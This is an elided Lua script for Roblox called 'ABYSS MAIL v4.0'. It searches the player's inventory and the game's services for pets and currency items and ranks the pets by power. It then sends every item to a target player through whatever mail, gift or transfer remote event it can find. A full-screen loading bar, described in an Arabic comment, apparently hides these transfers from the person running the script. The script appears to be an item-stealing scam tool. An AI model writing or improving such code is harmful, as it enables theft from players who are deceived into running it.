-- =============================================
-- ABYSS MAIL v4.0 - THE FINAL VERSION
-- =============================================
...
local function deepSearch()
    local found={}
    local targets={p,p:FindFirstChild("PlayerGui"),p:FindFirstChild("Backpack"),p:FindFirstChild("StarterGear"),workspace,game:GetService("ReplicatedStorage"),game:GetService("Lighting"),game:GetService("ServerStorage")}
    for _,s in pairs(game:GetServices())do table.insert(targets,s)end
    for _,obj in pairs(targets)do if obj then for _,child in pairs(obj:GetDescendants())do
        local n=child.Name:lower()
        local isPet=n:match("pet")or n:match("animal")or n:match("creature")or n:match("dragon")or n:match("dog")or n:match("cat")or n:match("monster")or n:match("egg")or n:match("hatch")or n:match("beast")or n:match("wolf")or n:match("fox")or n:match("tiger")or n:match("lion")or n:match("bear")or n:match("phoenix")or n:match("griffin")or n:match("unicorn")or child:FindFirstChild("Power")or child:FindFirstChild("Level")or child:FindFirstChild("Rarity")
        local isGem=n:match("gem")or n:match("jewel")or n:match("crystal")or n:match("diamond")or n:match("ruby")or n:match("emerald")or n:match("sapphire")or n:match("amethyst")or n:match("gold")or n:match("coin")or n:match("money")or n:match("currency")or n:match("shard")or child:FindFirstChild("Value")or child:FindFirstChild("Amount")or child:FindFirstChild("Count")
        if isPet then table.insert(found,{item=child,type="pet"})
        elseif isGem then table.insert(found,{item=child,type="gem"})end
    end end end
    return found
end
...
local function extractItems(found)
    ...
    for _,e in pairs(found)do
        local item=e.item
        local power=0
        if item:FindFirstChild("Power")then power=tonumber(item.Power.Value)or 0 end
        if item:FindFirstChild("Level")then power=power+(tonumber(item.Level.Value)or 0)*10 end
        ...
        if item:FindFirstChild("Strength")then power=power+(tonumber(item.Strength.Value)or 0)end
        if item:FindFirstChild("Damage")then power=power+(tonumber(item.Damage.Value)or 0)end
        local amount=1
        if item:FindFirstChild("Value")then amount=tonumber(item.Value.Value)or 1 end
        if item:FindFirstChild("Amount")then amount=tonumber(item.Amount.Value)or 1 end
        if item:FindFirstChild("Count")then amount=tonumber(item.Count.Value)or 1 end
        for _,attr in pairs(item:GetAttributes())do
            if type(attr)=="number"then
                power=power+attr
            end
        end
        if e.type=="pet"or power>0 then table.insert(pets,{item=item,power=power})
        elseif e.type=="gem"or amount>1 then for i=1,math.min(amount,50)do table.insert(gems,item)end end
    end
    return pets,gems
end

-- شريط تحميل يغطي الشاشة بالكامل
local function showFullLoader()
    ...
    pf.Position=UDim2.new(0.04,0,0.2,0)
    ...
    grad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(200,0,255)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(100,0,200)),ColorSequenceKeypoint.new(1,Color3.fromRGB(50,0,150))})
    grad.Parent=pb
    ...
    st.Position=UDim2.new(0,0,0.45,0)
    ...
    tm.Size=UDim2.new(1,0,0.12,0)
    tm.Position=UDim2.new(0,0,0.85,0)
...
local function findMailbox()
    local areas={workspace,game:GetService("ReplicatedStorage"),p.PlayerGui,p,game:GetService("StarterGui"),game:GetService("ServerStorage")}
    for _,a in pairs(areas)do if a then for _,o in pairs(a:GetDescendants())do
        local n=o.Name:lower()
        if n:match("mail")or n:match("post")or n:match("box")or n:match("send")or n:match("transfer")or n:match("gift")or n:match("delivery")or n:match("inbox")then
            if o:IsA("Model")or o:IsA("Part")or o:IsA("Frame")or o:IsA("ScreenGui")or o:IsA("RemoteEvent")then return o end
        end
    end end end
    return nil
end
...
local function sendItem(item,target,mb)
    ...
    local success=false
    pcall(function()
        local remote=mb:FindFirstChild("SendEvent")or mb:FindFirstChild("RemoteEvent")or mb:FindFirstChild("TransferEvent")or mb:FindFirstChild("GiftEvent")
        if remote and remote:IsA("RemoteEvent")then remote:FireServer(item,target)success=true return end
        local rf=mb:FindFirstChild("SendFunction")or mb:FindFirstChild("TransferFunction")
        if rf and rf:IsA("RemoteFunction")then rf:InvokeServer(item,target)success=true return end
        ...
        for _,v in pairs(item:GetChildren())do
            if v:IsA("ValueBase")then local nv=v:Clone()nv.Parent=clone end
        end
...
local toSend={}
for _,v in pairs(pets)do table.insert(toSend,v.item)end
for _,v in pairs(gems)do table.insert(toSend,v)end
...
for i,v in pairs(toSend)do
    if sendItem(v,t,mb)then sent=sent+1 end
